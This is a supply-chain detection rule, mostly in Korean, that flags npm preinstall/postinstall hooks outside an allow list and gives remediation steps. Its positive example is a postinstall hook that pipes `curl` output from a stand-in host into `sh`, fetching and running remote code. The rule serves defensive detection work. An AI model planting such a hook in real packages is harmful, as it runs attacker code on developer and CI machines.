---
id: GOV-NPM-INSTALL-HOOK-001
title_ko: npm 설치 시점에 실행되는 스크립트(preinstall·postinstall)가 허용 목록 밖에 있습니다
title_en: npm install-time lifecycle scripts (own package.json or lockfile hasInstallScript/requiresBuild) outside the allow list
status: approved
source_layer: baseline
sources:
  - publisher: npm
    document: npm Docs — scripts (life cycle)
    url: https://docs.npmjs.com/cli/v11/using-npm/scripts
  - publisher: GitHub
    document: npm 12 disables dependency install scripts by default (2026-07)
  - publisher: JFrog Security Research
    document: Shai-Hulud npm worm (2026-08) — preinstall → bun bootstrap
cwe: [CWE-829, CWE-1357]
severity: high
decision_default: block
domains: [supply-chain]
languages: [javascript, typescript]
scenarios: [web-app, agent, llm-integration, package-install]
related_baseline: [INTEL-2026-SLOPSQUATTING, GOV-AUTOEXEC-PYTHON-STARTUP-001]
verified_at: 2026-10-24
review_due: 2027-04-24
detection:
  # npm-surface 판정기. 세 자리를 본다:
  #   (1) 프로젝트 자신의 package.json scripts — 네트워크·인터프리터 코드·디코딩이면 confirmed, 허용 어휘 밖이면 likely
  #   (2) package-lock hasInstallScript / pnpm requiresBuild 패키지 — 허용 목록(config/install-scripts-allow.yaml) 밖만, 락파일당 1건 likely
  #   (3) .npmrc ignore-scripts=false — likely
  patterns: []
  confidence: likely
  category: supply-chain
  why_it_matters: >-
    `preinstall`·`install`·`postinstall`·`prepare` 는 `npm install` 한 번에 **개발 PC·CI 권한으로** 실행됩니다.
    2025-08 Nx, 2025-09~2026-08 Shai-Hulud 전 차수, 2026-06 Mastra 가 전부 이 시점을 썼습니다. npm 12 는 의존성
    훅을 기본 비활성으로 바꿨지만 공공기관 PC 의 npm 은 대부분 그 이전입니다. 훅 **존재**는 악성이 아닙니다 —
    네이티브 바이너리(sharp·esbuild)와 개발 도구(husky·prisma)도 훅을 씁니다. 그래서 허용 목록 밖만, 락파일당
    한 건으로 "무엇이 설치 때 실행되는지 보라"는 신호를 냅니다. 기존 SCA 는 레지스트리 메타데이터만 봐서 락파일에만
    있는 전이 의존성의 훅을 놓쳤습니다.
  public_sector_impact:
    - 설치 한 번에 개발 PC 자격증명·AI 도구 토큰 유출 → 기관 저장소·패키지 재전파
  safe_fix: |
    1. 목록의 패키지가 **왜 설치 훅이 필요한지** 확인하세요(네이티브 빌드? 바이너리 다운로드?). 정당하면 기관 허용 목록
       (`GVSKB_INSTALL_SCRIPTS_ALLOW`)에 올려 다음부터 조용히 통과시킵니다.
    2. 프로젝트 자신의 훅이 `curl`·`node -e`·base64 디코딩을 하면 **그 저장소를 격리**하고 작성자를 확인하세요.
    3. CI 는 `npm ci --ignore-scripts` 로 설치하고, 필요한 빌드만 명시적으로 돌리세요. npm 12 이상이면 기본값이 그렇습니다.
  references:
    - npm Docs — scripts
    - CWE-829 Inclusion of Functionality from Untrusted Control Sphere
  can_auto_fix: false
examples:
  positive:
    - '{"scripts": {"postinstall": "node -e \"require(\\"child_process\\").execSync(\\"curl -s https://x.example/i | sh\\")\""}}'
  negative:
    - '{"scripts": {"prepare": "husky", "build": "tsc"}}'
---

## 오해하지 마세요

허용 목록(`config/install-scripts-allow.yaml`)의 패키지와 `husky`·`patch-package`·`prisma` 같은 명령은 잡지 않는다.
